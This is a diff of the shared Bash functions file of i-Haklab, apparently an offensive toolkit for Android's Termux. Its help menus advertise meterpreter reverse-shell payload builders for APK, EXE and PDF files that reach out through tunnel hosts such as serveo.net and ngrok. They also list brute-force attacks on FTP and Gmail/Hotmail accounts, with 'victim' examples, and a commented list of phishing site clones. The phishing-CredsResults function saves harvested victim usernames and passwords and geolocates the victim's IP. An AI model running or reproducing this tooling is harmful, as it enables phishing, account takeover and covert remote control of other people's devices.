@@ -1,11 +1,7 @@
 #!/bin/bash
 # This file contain all i-Haklab functions
 
-if [ -d /data/data/com.termux/files/home/i-Haklab ]; then
-	iHAKLAB=/data/data/com.termux/files/home/i-Haklab
-else
-	iHAKLAB=/data/data/com.termux/files/home/storage/external-1/roothome/i-Haklab
-fi
+iHAKLAB=/data/data/com.termux/files/usr/share/i-Haklab
 
 banner() {
 	if [ ! -e $iHAKLAB/.set/libexec/banner/i-Haklab ]; then
@@ -16,44 +12,6 @@ banner() {
 }
 export -f banner
 
-chk-iHaklab() {
-	until [ -d $iHAKLAB ]; do
-		printf "$R\n[W]:-> i-Haklab needed$W |$Y Do y ou wanna install it?$W\n"
-        	while read -p "[yes/no]:-> " yesorno && [ -z $yesorno ]; do
-                	continue
-        	done
-        	if [ $yesorno = "yes" ] || [ $yesorno = "Yes" ] || [ $yesorno = "YES" ]; then
-                	git clone https://github.com/ivam3/i-Haklab.git $HOME/i-Haklab
-                	cd ~/i-Haklab;bash setup-lite
-        	else
-                	printf "$G\n[!]-> Have a nice hacking day!!\n\n"
-                	exit
-        	fi
-	done
-}
-export -f chk-iHaklab
-
-ctrl_c() {
-	printf "$Y\n[!]$R Need a help? join to$B Telegram$R t.me/Ivam3_Bot$W\n"
-}
-export -f ctrl_c
-
-chk-Cuser() {
-	while [ ! $(id -u) -ne 0 ]; do
-        	printf "$R\n[W]:-> You need to be a common user$W\n"
-        	exit
-	done
-}
-export -f chk-Cuser
-
-chk-Ruser() {
-	while [ ! $(id -u) -eq 0 ]; do
-		printf "$R\n[W]:-> You need to be a root user$W\n"
-		exit
-	done
-}
-export -f chk-Ruser
-
 k-boom() {
 	if [ ! -e $iHAKLAB/.set/libexec/banner/k-boom ]; then
 		wget https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/libexec/banner/k-boom -O $iHAKLAB/.set/libexec/banner/k-boom > /dev/null 2>&1
@@ -62,105 +20,97 @@ k-boom() {
 }
 export -f k-boom
 
-Menu() {
-	printf "$Y\n[i]->$W i-Haklab v.2.0 (c) 2020 by Ivam3 - Is a hacking laboratory that contains open source tools recommended by Ivam3. If the law is violated with it's use, this would be the responsibility of the user who handled it.\n$Y\nSyntax:$W i-Haklab [-arg-] [-option-]\n
-$Y Arguments$W  |$Y    Options$W     |$Y    Description$W
-╰─help─────➤────────────────➤ Show this help menu
-╰─list─────➤────────────────➤ List all available tools/frameworks
-╰─show─────➤──tools/books───➤ Show details about specific tools/books
-|   ╰───────────|─────|─────➤ availables to be downloaded
-|   |           ╰─────|─────➤ ex : i-Haklab show bettercap
-|   |                 ╰─────➤ ex : i-Haklab show books
-|   ╰──────➤──tutorials/QG──➤ Show tutorials and Quick Guides availables
-|   ╰──────➤─────games──────➤ Show games available for play
-╰─install──➤───tool─name────➤ Install tools or frameworks
-╰─remove───➤───tool─name────➤ Remove tools or frameworks
-╰─weechat──➤────────────────➤ Connect with irc Ivam3byCinderella chat
-╰─update───➤────────────────➤ Update i-Haklab
-╰speedtest─➤────────────────➤ Run a speed test of your network
-╰─root─────➤────────────────➤ Simulates a super user environment
-╰─restore──➤────────────────➤ Restore the main directory to fix some bugs
-╰reinstall─➤────────────────➤ Reinstall i-Haklab to factory configurations
-╰─version──➤────────────────➤ Show i-Haklab version installed
-|          |       |        |
-|          |       |        |
-  $Y [--] Automatitation Arguments [--]$W
- Arguments |    Options     |    Description
-|───apk────➤──inlan/outlan──➤ Create a coded payload apk
-|    |          ╰─────|─────➤ LPORT=4546 apk=inlan.apk
-|    |                ╰─────➤ LPORT=48263 LHOST=serveo.net apk=outlan.apk
-|    ╰──────────────────────➤ Payload=android/meterpreter/reverse_tcp
-╰──bfftp───➤─user─passwd─ip─➤ Start a brute force attack at ftp server
-|    ╰──────────────────────➤ example: i-Haklab bfftp users.txt passwords.txt 0.0.0.0
-
-╰──bfmail──➤──email─passwd──➤ Start a brute force attack
-|    ╰──────────────────────➤ at email(hotmail/gmail) account
-|    ╰─────➤─────gmail──────➤ ex: i-Haklab bfgmail victim@gmail.com passwords.txt
-|    ╰─────➤──hotmail/live──➤ ex: i-Haklab bfgmail victim@live.com passwords.txt
-|──ESmsg───➤─encode/decode──➤ Encode|decode secret message into a ASCII file.
-╰forwarding➤────────────────➤ Start a SSH client to request TCP port forwarding
-|    ╰──────────────────────➤ from server and proxy.
-|    ╰─────➤──port_number───➤ Set a specific port number 
-|                  ╰────────➤ (default 4546 or 80 for rooted device)
-|    ╰─────➤───subdomain────➤ Set a specitic subdomain
-|    ╰──────────────────────➤ ex: i-Haklab forwarding <myport> <my-subdomain>
-╰─handler──➤──file.rc name──➤ Start handler on msfconsole with previous setting
-╰─payexe───➤──inlan/outlan──➤ Create a coded payload .exe with msfvenom
-|               ╰─────|─────➤ LPORT=4546 Payload=windows/meterpreter/reverse_tcp
-|                     ╰─────➤ LPORT=48263 Payload=windows/meterpreter/reverse_tcp
-|                     ╰─────➤ LHOST=serveo.net file=outlan.exe
-╰─paylink──➤─pc/nexam/soa5──➤ Create an infected link with payload
-|             ╰───|────|────➤ Targets: [0]generic [1]windows [2]macOS [3]linux
-|                 |    |      ex: i-Haklab paylink pc 2
-|                 ╰────|────➤ For targets [0]nexxus and [29]samsung
-|                      |      ex: i-Haklab paylink nexam 29
-|                      ╰────➤ For android5 operative system only
-╰─paypdf───➤────────────────➤ Create a pdf file with a reverse payload
-╰─share────➤upload/download─➤ Share files and directories remotely and securely
-|             ╰───────|─────➤ Upload file and/or directory to share
-|             ╰───────|─────➤ ex: i-Haklab share upload file.txt password(optional)
-|                     ╰─────➤ Download files and/or directory shared
-|                     ╰─────➤ ex: i-Haklab share download https://send.vis.ee/download/...
-╰─shodan───➤────────────────➤ Search vulnerable webcam servers using metasploit
-|__________________________________________________________________________________________\n\n"
+running(){
+        for i in . .. ... ....;do
+                printf "$G$(clear)(_>)─➤ i-Haklab running $i\n$W"
+                sleep 0.1
+        done
 }
-#╰─phishing─➤──site─redirect─➤ Clone a specific website for phishing tests
-#|    ╰──────────────────────➤ Available: facebook mfacebook github google
-#|    ╰──────────────────────➤ instagram netflix spotify twitter
-#|    ╰──────────────────────➤ ex: i-Haklab mfacebook facebook.comexport -f Menu
+export -f running
+
+STDERROOT(){ printf "$R\n(_>)─➤$W Rooted device required";exit;}
+export -f STDERROOT
+
+chk-iHaklab() {
+	until [ -d $iHAKLAB ]; do
+		printf "$R\n(_>)─➤ i-Haklab needed$W |$Y Do you wanna install it?$W\n"
+        	while read -p "(yes/no)─➤ " yesorno && [ -z $yesorno ]; do
+                	continue
+        	done
+        	if [ $yesorno = "yes" ] || [ $yesorno = "Yes" ] || [ $yesorno = "YES" ]; then
+                	git clone https://github.com/ivam3/i-Haklab.git $HOME/i-Haklab
+                	cd ~/i-Haklab;bash setup-lite
+        	else
+                	printf "$Goke\n(_>)─➤ Have a nice hacking day!!\n$W"
+                	exit
+        	fi
+	done
+}
+export -f chk-iHaklab
+
+chk-Cuser() {
+	while [ ! $(id -u) -ne 0 ]; do
+        	printf "$R\n(_>)─➤$W You need to be a common user\n"
+        	exit
+	done
+}
+export -f chk-Cuser
+
+chk-Ruser() {
+	while [ ! $(id -u) -eq 0 ]; do
+		printf "$R\n(_>)─➤ You need to be a root user$W\n"
+		exit
+	done
+}
+export -f chk-Ruser
 
 chk-api() {
-        command -v termux-open > /dev/null || { printf "$R[w]->$W termux-tools needed$R |$W please install it"; exit; }
+        command -v termux-open > /dev/null || { printf "$R(_>)─➤$W termux-tools needed$R |$W run i-Haklab install termux-tools"; exit; }
 }
 export -f chk-api
 
 chk-sudo() {
-        command -v sudo > /dev/null || { printf "$R[w]->$W sudo command needed$R |$W please install it"; exit; }
+        command -v sudo > /dev/null || { printf "$R(_>)─➤$W sudo command needed$R |$W please install it"; exit; }
 }
 export -f chk-sudo
 
+chk-root(){
+        if [[ -x /system/xbin/su ]] || [[ -x /su/bin/su ]] || [[ -x /sbin/su ]];then
+		chk-sudo
+                return 0
+        else
+                return 1
+        fi
+        }
+export -f chk-root
+
 chk-msf() {
-        command -v msfconsole > /dev/null || { printf "$R\n[W]->$W Metasploit needed$R |$W please install it"; exit; }
+        command -v msfconsole > /dev/null || { printf "$R\n(_>)─➤$W Metasploit needed$R |$W run i-Haklab install metasploit";exit; }
 }
 export -f chk-msf
 
+chk-java() {
+command -v java >/dev/null || { printf "$R\n(_>)$W java needed$R |$W run i-Haklab install java";exit; }
+}
+export -f chk-java
+
 chk-php() {
-        command -v php > /dev/null || { printf "$R\n[W]->$W php not found$R |$W run apt install php"; exit; }
+        command -v php > /dev/null || { printf "$R\n(_>)─➤$W php not found$R |$W run i-Haklab install php"; exit; }
 }
 export -f chk-php
 
 chk-ssh() {
-        command -v ssh > /dev/null || { printf "$R\n[W]->$W ssh not found$R |$W run apt install openssh"; exit; }
+        command -v ssh > /dev/null || { printf "$R\n(_>)─➤$W ssh not found$R |$W run i-Haklab install openssh"; exit; }
 }
 export -f chk-ssh
 
 chk-mega() {
-        command -v megadl > /dev/null || { printf "$R\n[W]->$W megatools not found$R |$W run apt install megatools"; exit; }
+        command -v megadl > /dev/null || { printf "$R\n(_>)─➤$W megatools not found$R |$W run i-Haklab install megatools"; exit; }
 }
 export -f chk-mega
 
 chk-hydra() {
-        command -v hydra > /dev/null || { printf "$R\n[W]->$W hydra not found$R |$W run apt install hydra"; exit; }
+        command -v hydra > /dev/null || { printf "$R\n(_>)─➤$W hydra not found$R |$W run i-Haklab install hydra"; exit; }
 }
 export -f chk-hydra
 
@@ -175,7 +125,7 @@ chk-tunnel() {
 	elif ping -q -c 1 -W 1 serverless.social >/dev/null 2>&1;then
 		TUNNEL="serverless.social"
 	else
-		printf "$R\n[W]->$W Server not available$R |$W try it later\n"
+		printf "$R\n(_>)─➤$W Server not available$R |$W try it later\n"
 		exit
 	fi
 }
@@ -186,16 +136,64 @@ chk-snow() {
 }
 export -f chk-snow
 
+Menu() {
+	printf "$Y\n(_>)─➤$W i-Haklab v.3.0 (c) 2021 by @Ivam3 - Is a hacking laboratory that contains open source tools recommended by Ivam3. If the law is violated with it's use, this would be the responsibility of the user who handled it.\n$Y\nSyntax:$W i-Haklab [-arg-] [-option-]\n
+$Y OPTIONS$W|$Y   Arguments$W   |$Y    Description$W
+╰─about─────+──<name─of─tool>───➤ Show informations about tool/framework
+|   ╰───example─────────────────{─i-Haklab about crunch─}
+╰─help/-h───➤───────────────────➤ Show this help menu
+╰─install───+──<name─of─tool>───➤ Install an specifics tools/frameworks
+|   ╰───────+─────alltools──────➤ Install all tools/frameworks available on i-Haklab
+╰reinstall──➤───────────────────➤ Re-configure i-Haklab at default settings
+╰─remove────+──<name─of─tool>───➤ Remove an specifics installed tools/frameworks
+|   ╰───────+─────alltools──────➤ Remove all installed tools/frameworks
+╰─restore───➤───────────────────➤ Restore the main directory to fix some bugs
+╰─root──────➤───────────────────➤ Simulates a super user environment
+╰─show──────+─────alltools──────➤ List all tools/frameworks available on i-Haklab
+|   ╰───────+──────tools────────➤ Show all installed tools/framewotks
+|   ╰───────+──────games────────➤ Show all games available to play on Termux
+|   ╰───────+──────books────────➤ Show all books available to download
+|   ╰───────+─────tutorials─────➤ Show tutorials available
+|   ╰───────+───────QG──────────➤ Show quick guides available
+╰speedtest──➤───────────────────➤ Run a speed test of your network
+╰─update────➤───────────────────➤ Update i-Haklab
+╰─version───➤───────────────────➤ Show i-Haklab version installed
+╰─weechat───➤───────────────────➤ Connect with irc Ivam3byCinderella chat
+|           |                   |
+|           |                   |
+  $Y [--] Automatitation Arguments [--]$W
+  OPTIONS  |     ARGUMENTS      |    DESCRIPTIONS
+╰───bf─────+─ftp/mail+IP/email──➤ Brute force attack at server ftp or smtp(hotmail|live|gmail)
+|    ╰──example─for─ftp+IP──────{─i-Haklab bf ftp 10.10.10.16
+|    ╰──example─for─mail+email──{─i-Haklab bf mail ivam3@hotmail.com
+|──ESmsg───➤───<encode/decode>──➤ Encode|decode secret message into a ASCII file.
+╰forwarding➤─<port─+─subdomain>─➤ Start a SSH client to request TCP port forwarding
+|    ╰──example─────────────{─i-Haklab forwarding 4444 my-subdomain-}
+╰─handler──+─<nome─of─file.rc>──➤ Start handler on msfconsole with previous setting
+|─payapk───+─<tunnelDNS─+─port>─➤ Create a coded payload apk
+|    ╰──example─for─outlan──────{─i-Haklab payapk 6.tcp.ngrok.io 23453─}
+|─payexe───+─<tunnelDNS─+─port>─➤ Create a coded payload .exe
+|    ╰──example─for─inlan───────{─i-Haklab payapk 192.168.0.1 8080─}
+|─paypdf───+─<tunnelDNS─+─port>─➤ Create a coded payload .pdf
+|    ╰──example─for─default─set─{─i-Haklab payapk─}
+╰─share────+─<upload/download>──➤ Share files and directories remotely and securely
+|               ╰───────|───────{─i-Haklab share upload file.txt password(optional)─}
+|                       ╰───────{i-Haklab share download https://send.vis.ee/download/..─}
+╰─shodan───➤────────────────────➤ Search vulnerable webcam servers using metasploit
+|__________________________________________________________________________________________\n\n"
+}
+export -f Menu
+
 phishing-CredsResults() {
 	ACCOUNT=$(grep -o 'Account:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
 	if [ ! -z $ACCOUNT ]; then
-		printf "$G\n[+]-> ACCOUNT:$W$ACCOUNT"
+		printf "$G\n(_>)─➤ ACCOUNT:$W$ACCOUNT"
 		echo $ACCOUNT >> $TMP_PATH/creds.txt
 		sleep 0.5
 	fi
 	PASSWD=$(grep -o 'Pass:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
 	if [ ! -z $PASSWD ]; then
-		printf "$G\n[+]-> PASSWORD:$W$PASSWD"
+		printf "$G\n(_>)─➤ PASSWORD:$W$PASSWD"
 		echo $PASSWD >> $TMP_PATH/creds.txt
 		sleep 0.5
 	fi
@@ -207,62 +205,62 @@ IP=$(grep -a 'IP:' $TMP_PATH/ip.txt | cut -d " " -f2 | tr -d '\r' | head -n1)
 IPTRACKER=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$IP" --user-agent "Mozilla/5.0 (X11: Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > $TMP_PATH/iptracker.log)
 
 if [ ! -z $IP ]; then 
-	printf "$G\n[+]-> IP:$W$IP"
+	printf "$G\n(_>)─➤ IP:$W$IP"
 	echo $IP >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 
 UA=$(grep 'User-Agent:' $TMP_PATH/ip.txt | cut -d '"' -f2 | head -n1 | awk '{print $1 $2 $3 $4 $5 $6}')
 if [ ! -z $UA ]; then
-	printf "$G\n[+]-> User Agent$W$UA"
+	printf "$G\n(_>)─➤ User Agent$W$UA"
 	echo $UA >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 IP_SPEED=$(grep -o "IP Address Speed:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 if [ ! -z '$IP_SPEED' ]; then
-	printf "$G\n[+]-> IP Address speed:$W$IP_SPEED"
+	printf "$G\n(_>)─➤ IP Address speed:$W$IP_SPEED"
 	echo $IP_SPEED >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 IP_CURRENCY=$(grep -o "IP Currency:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 if [ ! -z '$IP_CURRENCY' ]; then
-	printf "$G\n[+]-> IP Currency:$W$IP_CURRENCY"
+	printf "$G\n(_>)─➤ IP Currency:$W$IP_CURRENCY"
 	echo $IP_CURRENCY >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 CONTINENT=$(grep -o "Continent.*" $TMP_PATH/iptracker.log | cut -d ">" -f3 | cut -d "<" -f1)
 if [ ! -z '$CONTINENT' ]; then
-	printf "$G\n[+]-> Continent:$W$CONTINENT"
+	printf "$G\n(_>)─➤ Continent:$W$CONTINENT"
 	echo $CONTINENT >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 COUNTRY=$(grep -o "Country:.*" $TMP_PATH/iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
 if [ ! -z $COUNTRY ]; then
-	printf "$G\n[+]-> Country:$W$COUNTRY"
+	printf "$G\n(_>)─➤ Country:$W$COUNTRY"
 	echo $COUNTRY >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 STATE=$(grep -o "tracking lessimpt.*" $TMP_PATH/iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
 if [ ! -z '$STATE' ]; then
-	printf "$G\n[+]-> State:$W$STATE"
+	printf "$G\n(_>)─➤ State:$W$STATE"
 	echo $STATE >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 CITY=$(grep -o "City Location:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 if [ ! -z $CITY ]; then
-	printf "$G\n[+]-> City:$W$CITY"
+	printf "$G\n(_>)─➤ City:$W$CITY"
 	echo $CITY >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 ISP=$(grep -o "ISP:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 if [ ! -z $ISP ]; then
-	printf "$G\n[+]-> ISP:$W$IPS"
+	printf "$G\n(_>)─➤ ISP:$W$IPS"
 	echo $ISP >> $TMP_PATH/creds.txt
 	sleep 0.5
 fi
 AS_NUM=$(grep -o "AS Number" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 if [ ! -z '$AS_NUM' ]; then
-	printf  "$G\n[+]-> AS Number:$W$AS_NUM"
+	printf  "$G\n(_>)─➤ AS Number:$W$AS_NUM"
 	echo $AS_NUM >> $TMP_PATH/creds.txt
 	sleep 0.5 
 fi
